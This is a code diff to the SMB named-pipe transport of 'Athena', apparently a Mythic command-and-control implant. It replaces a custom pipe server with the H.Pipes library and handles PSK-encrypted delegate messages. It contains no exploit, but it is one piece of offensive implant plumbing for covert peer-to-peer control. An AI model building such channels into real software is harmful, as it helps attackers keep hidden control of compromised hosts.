@@ -1,44 +1,14 @@
 ﻿using Athena.Models.Mythic.Response;
 using Athena.Utilities;
-using Athena.Models.Athena.Pipes;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Concurrent;
-using System.IO.Pipes;
 using System.Threading.Tasks;
+using H.Pipes;
+using H.Pipes.Args;
 
 namespace Athena.Config
 {
-    public class ServerPipe : BasicPipe
-    {
-        public event EventHandler<EventArgs> Connected;
-
-        protected NamedPipeServerStream serverPipeStream;
-        protected string PipeName { get; set; }
-
-        public ServerPipe(string pipeName, Action<BasicPipe> asyncReaderStart)
-        {
-            this.asyncReaderStart = asyncReaderStart;
-            PipeName = pipeName;
-
-            serverPipeStream = new NamedPipeServerStream(
-                pipeName,
-                PipeDirection.InOut,
-                NamedPipeServerStream.MaxAllowedServerInstances,
-                PipeTransmissionMode.Message,
-                PipeOptions.Asynchronous);
-
-            pipeStream = serverPipeStream;
-            serverPipeStream.BeginWaitForConnection(new AsyncCallback(PipeConnected), null);
-        }
-
-        protected void PipeConnected(IAsyncResult ar)
-        {
-            serverPipeStream.EndWaitForConnection(ar);
-            Connected?.Invoke(this, new EventArgs());
-            asyncReaderStart(this);
-        }
-    }
     public class MythicConfig
     {
         public Smb currentConfig { get; set; }
@@ -65,8 +35,8 @@ namespace Athena.Config
     public class Smb
     {
         public string psk { get; set; }
-        private ServerPipe serverPipe { get; set; }
-        public string pipeName = "pipe_name"; //Will need to handle this in the builder.py 
+        private PipeServer<string> serverPipe { get; set; }
+        public string pipeName = "pipe_name";
         private bool connected { get; set; }
         public bool encrypted { get; set; }
         public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
@@ -83,50 +53,42 @@ namespace Athena.Config
                 this.crypt = new PSKCrypto(uuid, this.psk);
                 this.encrypted = true;
             }
-            this.serverPipe = CreateServer();
+            this.serverPipe = new PipeServer<string>(this.pipeName);
+            this.serverPipe.ClientConnected += (o,args) => DoNewConnection();
+            this.serverPipe.ClientDisconnected += (o, args) => DoClientDisconnect();
+            this.serverPipe.MessageReceived += (sender, args) => DoMessageReceive(args);
+            this.serverPipe.StartAsync();
         }
 
-        private ServerPipe CreateServer()
-        {
-            ServerPipe serverPipe = new ServerPipe(this.pipeName, p => p.StartStringReaderAsync());
-            serverPipe.DataReceived += (sndr, args) =>
-                    Task.Run(() =>
-                    {
-                        DoDataReceived(args.String);
-                    });
-
-            serverPipe.Connected += (sndr, args) =>
-                Task.Run(() =>
-                {
-                    this.connected = true;
-                });
-            serverPipe.PipeClosed += (sendr, args) =>
-                Task.Run(() =>
-                {
-                    this.connected = false;
-                    this.serverPipe = CreateServer();
-                });
-            return serverPipe;
-        }
-
-        private void DoDataReceived(string msg)
+        private async void DoMessageReceive(ConnectionMessageEventArgs<string> args)
         {
             try
             {
-                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(msg);
-
                 //Add message to out queue.
+                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
                 this.queueIn.Enqueue(dm);
             }
             catch
             {
-                DelegateMessage dm = new DelegateMessage() { 
+                DelegateMessage dm = new DelegateMessage()
+                {
                     c2_profile = "smb",
                     uuid = "",
                     message = ""
                 };
             }
         }
+
+        public async void DoNewConnection()
+        {
+            this.connected = true;
+        }
+
+        public async void DoClientDisconnect()
+        {
+            this.connected = false;
+        }
+
         //Send, wait for a response, and return it to the main functions
         public async Task<string> Send(object obj)
         {
@@ -152,12 +114,13 @@ namespace Athena.Config
                     message = json,
                     c2_profile = "smb"
                 };
-
-                _ = this.serverPipe.WriteString(JsonConvert.SerializeObject(dm));
+                _ = this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm));
 
                 DelegateMessage res = new DelegateMessage();
 
-                while (!this.queueIn.TryDequeue(out dm)) { };
+                while (!this.queueIn.TryDequeue(out dm)) { if (!connected) {
+                        return ""; 
+                    } };
 
                 //Decrypt and return
                 if (this.encrypted)
